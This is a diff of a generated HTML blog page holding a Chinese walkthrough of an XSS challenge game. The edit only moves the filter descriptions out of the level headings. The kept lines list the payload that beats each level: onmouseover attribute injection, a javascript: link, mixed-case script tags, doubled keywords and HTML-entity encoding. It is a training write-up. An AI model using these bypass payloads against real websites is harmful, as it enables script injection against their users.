@@ -110,14 +110,14 @@
 <pre><code>1&#39; onmouseover=&#39;alert(1)</code></pre><hr>
 <h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/4.png" alt></p>
 <pre><code>1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
-<h4 id="第五关（把on的替换成o-n）"><a href="#第五关（把on的替换成o-n）" class="headerlink" title="第五关（把on的替换成o_n）"></a>第五关（把on的替换成o_n）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/5-1.png" alt></p>
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>（把on的替换成o_n）<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/5-1.png" alt></p>
 <pre><code>1&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;2&lt;/a&gt;</code></pre><p>插入后点击“<u>2</u>”链接<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/5-2.png" alt></p>
 <hr>
-<h4 id="第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）"><a href="#第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）" class="headerlink" title="第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）"></a>第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/6.png" alt><br>大小写绕过：</p>
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/6.png" alt><br>大小写绕过：</p>
 <pre><code>1&quot;&gt; &lt;SCript&gt;alert(1)&lt;/scripT&gt;</code></pre><hr>
-<h4 id="第七关（把on替换成空）"><a href="#第七关（把on替换成空）" class="headerlink" title="第七关（把on替换成空）"></a>第七关（把on替换成空）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/7.png" alt></p>
+<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>（把on替换成空）<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/7.png" alt></p>
 <pre><code>1&quot; oonnmouseover=&quot;alert(1)</code></pre><hr>
-<h4 id="第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）"><a href="#第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）" class="headerlink" title="第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）"></a>第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）</h4><p>利用burp suite转HTML编码，填入框中后添加友情链接，再点击友情链接。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/8-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/8-2.png" alt></p>
+<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）<br>利用burp suite转HTML编码，填入框中后添加友情链接，再点击友情链接。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/8-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/8-2.png" alt></p>
 <pre><code>javascript:alert(1)
 &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; </code></pre><hr>
 <h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>利用burp suite转HTML编码和http://格式的url，填入框中后添加友情链接，再点击友情链接。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/9-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/9-2.png" alt></p>
@@ -150,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6kkw5fl000664wr96lm7sft"
+      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6svvq9c0007lwwrf8io1rkb"
         class="article-share-link">Share</a>
       
     </footer>
